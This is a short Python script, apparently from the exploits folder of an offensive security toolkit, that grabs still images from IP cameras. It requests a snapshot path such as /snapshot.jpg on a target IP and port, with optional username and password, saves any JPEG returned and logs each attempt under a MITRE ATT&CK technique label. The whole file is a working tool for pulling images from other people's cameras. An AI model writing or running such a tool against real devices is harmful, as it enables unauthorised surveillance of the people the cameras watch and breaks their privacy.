# modules/exploits/ip_camera_snapshot_grabber.py

import argparse
import requests
from datetime import datetime
import os
import json
from urllib.parse import urljoin

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1123"  # Audio Capture (adapted to video surveillance)

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def grab_snapshot(ip, port, path, output, auth=None):
    url = urljoin(f"http://{ip}:{port}", path)
    try:
        r = requests.get(url, auth=auth, timeout=5)
        if r.status_code == 200 and b'\xff\xd8' in r.content[:4]:  # JPEG magic
            with open(output, 'wb') as f:
                f.write(r.content)
            print(f"[âœ“] Snapshot saved to {output}")
            success = True
        else:
            print(f"[!] Unexpected response or format")
            success = False
    except Exception as e:
        print(f"[!] Error: {e}")
        success = False

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}",
        "path": path,
        "output_file": output,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IP Camera Snapshot Grabber")
    parser.add_argument("--ip", required=True, help="Target camera IP")
    parser.add_argument("--port", default=80, type=int, help="Camera HTTP port")
    parser.add_argument("--path", default="/snapshot.jpg", help="Path to snapshot")
    parser.add_argument("--output", default="snapshot.jpg", help="Output file")
    parser.add_argument("--user", help="Username if required")
    parser.add_argument("--passw", help="Password if required")
    args = parser.parse_args()

    auth = (args.user, args.passw) if args.user and args.passw else None
    grab_snapshot(args.ip, args.port, args.path, args.output, auth)
